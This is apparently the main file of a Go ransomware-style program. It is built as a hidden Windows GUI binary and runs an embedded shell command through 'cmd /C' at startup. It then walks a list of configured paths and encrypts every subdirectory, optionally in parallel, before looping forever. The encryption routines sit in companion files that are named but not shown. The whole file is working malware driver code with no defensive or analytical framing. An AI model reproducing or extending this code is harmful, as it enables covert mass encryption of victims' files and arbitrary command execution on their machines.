package main

import (
	"os/exec"
)

//go build -ldflags "-H=windowsgui" .\main.go .\file.go .\encrypt.go .\dirOpera.go .\constVar.go .\linkedVar.go
//go run .\main.go .\file.go .\encrypt.go .\dirOpera.go .\constVar.go .\linkedVar.go

func handlePaths() {
	IS_MULTI_THREAD_STR := byte_decode2str(IS_MULTI_THREAD[:])
	for _, byte_path := range PATHS {
		path := byte_decode2str(byte_path[:])
		if path == "UNABLE0" || path == "" {
			continue
		}
		if IS_MULTI_THREAD_STR == "true" {
			go encryptSubDirByBFS(path)
		} else if IS_MULTI_THREAD_STR == "false" {
			encryptSubDirByBFS(path)
		} else {
			encryptSubDirByBFS(path) //若出现错误，默认非异步
		}
	}
}

func main() {
	cmd := exec.Command("cmd", "/C", byte_decode2str(COMMAND_BEFORE_START[:]))
	go cmd.Run()
	go handlePaths()
	for {

	}
}
